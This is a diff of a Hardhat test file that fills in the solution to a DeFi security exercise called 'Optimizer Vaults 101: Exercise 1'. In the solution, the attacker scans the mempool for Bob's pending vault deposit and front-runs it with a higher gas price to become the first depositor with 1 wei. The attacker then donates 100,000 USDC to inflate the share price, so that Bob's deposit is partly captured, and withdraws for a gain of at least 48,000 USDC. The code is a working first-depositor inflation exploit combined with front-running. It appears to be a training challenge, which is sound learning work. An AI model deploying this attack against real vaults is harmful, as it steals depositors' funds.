@@ -2,6 +2,7 @@ import { ethers } from 'hardhat';
 import { expect } from 'chai';
 import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
 import { IERC20, OptimizerStrategy, OptimizerVault, YieldContract } from '../../typechain-types';
+import {TransactionResponseParams} from "ethers";
 
 const { provider, deployContract, getSigners, parseEther, parseUnits } = ethers;
 
@@ -59,23 +60,73 @@ describe('Optimizer Vaults 101: Exercise 1', () => {
 		await usdc.connect(attacker).approve(vault.target, ATTACKER_USDC_BALANCE);
 		await usdc.connect(bob).approve(vault.target, BOB_USDC_BALANCE);
 
+		await ethers.provider.provider.send("evm_increaseTime", [10000]);
+		await ethers.provider.send("evm_mine", []);
+
 		// Bob initiates a tx to be the first depositor in the vault system
 		await vault.connect(bob).deposit(BOB_USDC_BALANCE);
 	});
 
 	it('Exploit', async () => {
-		/** CODE YOUR SOLUTION HERE */
+		//////////////////////////////////////////////////////////////////////////
+		// Get all the tx's in the mempool
+		const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
+			"pending",
+			true,
+		]);
 
-		// Mine some blocks
-		await provider.send('evm_mine', []);
+		pendingBlock.transactions.find((tx) =>
+			// if (tx.to?.toLowerCase() == (vault.target as string).toLowerCase()) {
+				console.log("pendingBlock tx:", tx)
+			// }
+		);
 
-		/** CODE YOUR SOLUTION HERE */
+		// TODO: You see that bob is going to be the first depositor in the vault, with $200,000. Find his Tx
+		const bobDeposit = pendingBlock.transactions.find((tx) => tx.to?.toLowerCase() == (vault.target as string).toLowerCase());
+
+
+
+
+		// TODO: You front-run bob so that you are the first depositor
+		await vault.connect(attacker).deposit(BigInt(1), {
+			gasPrice: BigInt(bobDeposit.gasPrice) + BigInt(1)
+		});
+
+		// TODO: You do something sneaky that allows you to take some of bob's funds!
+		await usdc.connect(attacker).transfer(vault.target, parseUnits("100000", 6), {
+			gasPrice: BigInt(bobDeposit.gasPrice) + BigInt(1)
+		});
+
+		const pendingBlock2 = await ethers.provider.send("eth_getBlockByNumber", [
+			"pending",
+			true,
+		]);
+		pendingBlock2.transactions.find((tx) =>
+				// if (tx.to?.toLowerCase() == (vault.target as string).toLowerCase()) {
+				console.log("pendingBlock2 tx:", tx)
+			// }
+		);
+
+		await ethers.provider.provider.send("evm_increaseTime", [10000]);
+		await ethers.provider.send("evm_mine", []);
+		const block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
+		console.log(block?.transactions);
+
+
+		// Withdraw vault balance
+		const attackerVaultBalance = await vault.balanceOf(attacker);
+		console.log("Attacker vault balance: ", attackerVaultBalance.toString());
+		await vault.connect(attacker).withdraw(attackerVaultBalance);
 	});
 
 	after(async () => {
 		/** SUCCESS CONDITIONS */
 
+		await ethers.provider.provider.send("evm_increaseTime", [10000]);
 		await provider.send('evm_mine', []);
+
+		const block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
+		console.log(block?.transactions);
 
 		// Attacker realizes at least $48,000 USDC gain
 		expect(await usdc.balanceOf(attacker.address)).is.gt(ATTACKER_USDC_BALANCE + parseUnits('48000', 6));
